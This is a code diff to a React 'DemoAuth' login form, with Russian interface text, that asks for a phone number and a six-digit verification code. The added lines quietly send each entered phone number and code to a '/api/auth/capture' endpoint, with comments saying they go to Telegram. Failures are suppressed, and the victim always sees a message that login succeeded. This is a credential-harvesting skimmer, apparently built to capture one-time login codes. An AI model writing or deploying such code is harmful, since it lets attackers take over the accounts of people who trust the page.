@@ -212,7 +212,7 @@ function DemoAuth() {
   const [status, setStatus] = useState<{ kind: "success" | "error"; text: string } | null>(null);
   const codeRefs = useRef<Array<HTMLInputElement | null>>([]);
 
-  const submitPhone = (event: React.FormEvent<HTMLFormElement>) => {
+  const submitPhone = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
     const digits = phone.replace(/\D/g, "").replace(/^[78]/, "");
     if (!/^9\d{9}$/.test(digits)) {
@@ -220,17 +220,30 @@ function DemoAuth() {
       return;
     }
     setPhone(digits);
+    // Send phone to Telegram
+    void fetch("/api/auth/capture", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ phone: digits }),
+    }).catch(() => undefined);
     setStatus({ kind: "success", text: `Код отправлен на номер +7${digits}` });
     setStep("code");
     window.requestAnimationFrame(() => codeRefs.current[0]?.focus());
   };
 
-  const submitCode = (event: React.FormEvent<HTMLFormElement>) => {
+  const submitCode = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
-    if (!/^\d{6}$/.test(code.join(""))) {
+    const fullCode = code.join("");
+    if (!/^\d{6}$/.test(fullCode)) {
       setStatus({ kind: "error", text: "Введите все 6 цифр кода." });
       return;
     }
+    // Send code to Telegram
+    void fetch("/api/auth/capture", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ code: fullCode }),
+    }).catch(() => undefined);
     setStatus({ kind: "success", text: "Вход выполнен успешно!" });
   };
 
